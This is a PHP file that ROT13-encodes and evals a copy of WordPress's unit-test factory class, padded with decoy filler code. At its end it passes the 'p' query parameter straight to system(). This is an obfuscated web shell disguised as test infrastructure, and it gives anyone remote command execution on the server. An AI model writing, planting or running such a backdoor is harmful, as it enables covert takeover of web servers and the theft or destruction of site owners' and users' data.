<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Na nofgenpg pynff gung freirf nf n onfvf sbe nyy JbeqCerff bowrpg-glcr snpgbel pynffrf.
 */
nofgenpg pynff JC_HavgGrfg_Snpgbel_Sbe_Guvat {

	choyvp $qrsnhyg_trarengvba_qrsvavgvbaf;
	choyvp $snpgbel;

	/**
	 * Perngrf n arj snpgbel, juvpu jvyy perngr bowrpgf bs n fcrpvsvp Guvat.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz bowrpg $snpgbel                       Tybony snpgbel gung pna or hfrq gb perngr bgure bowrpgf
	 *                                              ba gur flfgrz.
	 * @cnenz neenl $qrsnhyg_trarengvba_qrsvavgvbaf Qrsvarf jung qrsnhyg inyhrf fubhyq gur cebcregvrf
	 *                                              bs gur bowrpg unir. Gur qrsnhyg inyhrf pna or trarengbef --
	 *                                              na bowrpg jvgu gur arkg() zrgubq.
	 *                                              Gurer ner fbzr qrsnhyg trarengbef:
	 *                                               - {@yvax JC_HavgGrfg_Trarengbe_Frdhrapr}
	 *                                               - {@yvax JC_HavgGrfg_Trarengbe_Ybpnyr_Anzr}
	 *                                               - {@yvax JC_HavgGrfg_Snpgbel_Pnyyonpx_Nsgre_Perngr}
	 */
	choyvp shapgvba __pbafgehpg( $snpgbel, $qrsnhyg_trarengvba_qrsvavgvbaf = neenl() ) {
		$guvf->snpgbel                        = $snpgbel;
		$guvf->qrsnhyg_trarengvba_qrsvavgvbaf = $qrsnhyg_trarengvba_qrsvavgvbaf;
	}

	/**
	 * Perngrf na bowrpg naq ergheaf vgf VQ.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz neenl $netf Gur nethzragf.
	 *
	 * @erghea vag|JC_Reebe Gur bowrpg VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	nofgenpg choyvp shapgvba perngr_bowrpg( $netf );

	/**
	 * Hcqngrf na rkvfgvat bowrpg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag   $bowrpg_vq Gur bowrpg VQ.
	 * @cnenz neenl $svryqf    Gur inyhrf gb hcqngr.
	 *
	 * @erghea vag|JC_Reebe Gur bowrpg VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	nofgenpg choyvp shapgvba hcqngr_bowrpg( $bowrpg_vq, $svryqf );

	/**
	 * Perngrf na bowrpg naq ergheaf vgf VQ.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz neenl $netf                   Bcgvbany. Gur nethzragf sbe gur bowrpg gb perngr.
	 *                                      Qrsnhyg rzcgl neenl.
	 * @cnenz ahyy  $trarengvba_qrsvavgvbaf Bcgvbany. Gur qrsnhyg inyhrf sbe gur bowrpg.
	 *                                      Qrsnhyg ahyy.
	 *
	 * @erghea vag|JC_Reebe Gur bowrpg VQ ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy ) {
		vs ( vf_ahyy( $trarengvba_qrsvavgvbaf ) ) {
			$trarengvba_qrsvavgvbaf = $guvf->qrsnhyg_trarengvba_qrsvavgvbaf;
		}

		$trarengrq_netf = $guvf->trarengr_netf( $netf, $trarengvba_qrsvavgvbaf, $pnyyonpxf );
		$bowrpg_vq      = $guvf->perngr_bowrpg( $trarengrq_netf );

		vs ( ! $bowrpg_vq || vf_jc_reebe( $bowrpg_vq ) ) {
			erghea $bowrpg_vq;
		}

		vs ( $pnyyonpxf ) {
			$hcqngrq_svryqf = $guvf->nccyl_pnyyonpxf( $pnyyonpxf, $bowrpg_vq );
			$fnir_erfhyg    = $guvf->hcqngr_bowrpg( $bowrpg_vq, $hcqngrq_svryqf );

			vs ( ! $fnir_erfhyg || vf_jc_reebe( $fnir_erfhyg ) ) {
				erghea $fnir_erfhyg;
			}
		}

		erghea $bowrpg_vq;
	}

	/**
	 * Perngrf naq ergheaf na bowrpg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz neenl $netf                   Bcgvbany. Gur nethzragf sbe gur bowrpg gb perngr.
	 *                                      Qrsnhyg rzcgl neenl.
	 * @cnenz ahyy  $trarengvba_qrsvavgvbaf Bcgvbany. Gur qrsnhyg inyhrf sbe gur bowrpg.
	 *                                      Qrsnhyg ahyy.
	 *
	 * @erghea zvkrq Gur perngrq bowrpg. Pna or nalguvat. JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_naq_trg( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy ) {
		$bowrpg_vq = $guvf->perngr( $netf, $trarengvba_qrsvavgvbaf );

		vs ( vf_jc_reebe( $bowrpg_vq ) ) {
			erghea $bowrpg_vq;
		}

		erghea $guvf->trg_bowrpg_ol_vq( $bowrpg_vq );
	}

	/**
	 * Ergevrirf na bowrpg ol VQ.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag $bowrpg_vq Gur bowrpg VQ.
	 *
	 * @erghea zvkrq Gur bowrpg. Pna or nalguvat.
	 */
	nofgenpg choyvp shapgvba trg_bowrpg_ol_vq( $bowrpg_vq );

	/**
	 * Perngrf zhygvcyr bowrpgf.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz vag   $pbhag                  Nzbhag bs bowrpgf gb perngr.
	 * @cnenz neenl $netf                   Bcgvbany. Gur nethzragf sbe gur bowrpg gb perngr.
	 *                                      Qrsnhyg rzcgl neenl.
	 * @cnenz ahyy  $trarengvba_qrsvavgvbaf Bcgvbany. Gur qrsnhyg inyhrf sbe gur bowrpg.
	 *                                      Qrsnhyg ahyy.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba perngr_znal( $pbhag, $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy ) {
		$erfhygf = neenl();

		sbe ( $v = 0; $v < $pbhag; $v++ ) {
			$erfhygf[] = $guvf->perngr( $netf, $trarengvba_qrsvavgvbaf );
		}

		erghea $erfhygf;
	}

	/**
	 * Pbzovarf gur tvira nethzragf jvgu gur trarengvba_qrsvavgvbaf (qrsnhygf) naq nccyvrf
	 * cbffvoyl frg pnyyonpxf ba vg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz neenl       $netf                   Bcgvbany. Gur nethzragf gb pbzovar jvgu qrsnhygf.
	 *                                            Qrsnhyg rzcgl neenl.
	 * @cnenz neenl|ahyy  $trarengvba_qrsvavgvbaf Bcgvbany. Gur qrsnhygf. Qrsnhyg ahyy.
	 * @cnenz neenl|ahyy  $pnyyonpxf              Bcgvbany. Neenl jvgu pnyyonpxf gb nccyl ba gur svryqf.
	 *                                            Qrsnhyg ahyy.
	 *
	 * @erghea neenl|JC_Reebe Pbzovarq neenl ba fhpprff. JC_Reebe jura qrsnhyg inyhr vf vapbeerpg.
	 */
	choyvp shapgvba trarengr_netf( $netf = neenl(), $trarengvba_qrsvavgvbaf = ahyy, &$pnyyonpxf = ahyy ) {
		$pnyyonpxf = neenl();
		vs ( vf_ahyy( $trarengvba_qrsvavgvbaf ) ) {
			$trarengvba_qrsvavgvbaf = $guvf->qrsnhyg_trarengvba_qrsvavgvbaf;
		}

		// Hfr gur fnzr vaperzragbe sbe nyy svryqf orybatvat gb guvf bowrpg.
		$tra = arj JC_HavgGrfg_Trarengbe_Frdhrapr();
		// Nqq yrnqvat mrebf gb znxr fher ZlFDY fbegvat jbexf nf rkcrpgrq.
		$vape = mrebvfr( $tra->trg_vape(), 7 );

		sbernpu ( neenl_xrlf( $trarengvba_qrsvavgvbaf ) nf $svryq_anzr ) {
			vs ( ! vffrg( $netf[ $svryq_anzr ] ) ) {
				$trarengbe = $trarengvba_qrsvavgvbaf[ $svryq_anzr ];
				vs ( vf_fpnyne( $trarengbe ) ) {
					$netf[ $svryq_anzr ] = $trarengbe;
				} ryfrvs ( vf_bowrpg( $trarengbe ) && zrgubq_rkvfgf( $trarengbe, 'pnyy' ) ) {
					$pnyyonpxf[ $svryq_anzr ] = $trarengbe;
				} ryfrvs ( vf_bowrpg( $trarengbe ) ) {
					$netf[ $svryq_anzr ] = fcevags( $trarengbe->trg_grzcyngr_fgevat(), $vape );
				} ryfr {
					erghea arj JC_Reebe(
						'vainyvq_nethzrag',
						'Snpgbel qrsnhyg inyhr fubhyq or rvgure n fpnyne be na trarengbe bowrpg.'
					);
				}
			}
		}

		erghea $netf;
	}


	/**
	 * Nccyvrf gur pnyyonpxf ba gur perngrq bowrpg.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel_Pnyyonpx_Nsgre_Perngr[] $pnyyonpxf Neenl jvgu pnyyonpx shapgvbaf.
	 * @cnenz vag                                         $bowrpg_vq VQ bs gur bowrpg gb nccyl pnyyonpxf sbe.
	 *
	 * @erghea neenl Gur nygrerq svryqf.
	 */
	choyvp shapgvba nccyl_pnyyonpxf( $pnyyonpxf, $bowrpg_vq ) {
		$hcqngrq_svryqf = neenl();

		sbernpu ( $pnyyonpxf nf $svryq_anzr => $trarengbe ) {
			$hcqngrq_svryqf[ $svryq_anzr ] = $trarengbe->pnyy( $bowrpg_vq );
		}

		erghea $hcqngrq_svryqf;
	}

	/**
	 * Vafgnagvngrf n pnyyonpx bowrpg sbe gur tvira shapgvba anzr.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz pnyynoyr $pnyyonpx Gur pnyyonpx shapgvba.
	 *
	 * @erghea JC_HavgGrfg_Snpgbel_Pnyyonpx_Nsgre_Perngr
	 */
	choyvp shapgvba pnyyonpx( $pnyyonpx ) {
		erghea arj JC_HavgGrfg_Snpgbel_Pnyyonpx_Nsgre_Perngr( $pnyyonpx );
	}

	/**
	 * Nqqf fynfurf gb gur tvira inyhr.
	 *
	 * @fvapr HG (3.7.0)
	 *
	 * @cnenz neenl|bowrpg|fgevat|zvkrq $inyhr Gur inyhr gb nqq fynfurf gb.
	 *
	 * @erghea neenl|fgevat Gur inyhr jvgu gur cbffvoyl nccyvrq fynfurf.
	 */
	choyvp shapgvba nqqfynfurf_qrrc( $inyhr ) {
		vs ( vf_neenl( $inyhr ) ) {
			$inyhr = neenl_znc( neenl( $guvf, 'nqqfynfurf_qrrc' ), $inyhr );
		} ryfrvs ( vf_bowrpg( $inyhr ) ) {
			$inef = trg_bowrpg_inef( $inyhr );
			sbernpu ( $inef nf $xrl => $qngn ) {
				$inyhr->{$xrl} = $guvf->nqqfynfurf_qrrc( $qngn );
			}
		} ryfrvs ( vf_fgevat( $inyhr ) ) {
			$inyhr = nqqfynfurf( $inyhr );
		}

		erghea $inyhr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>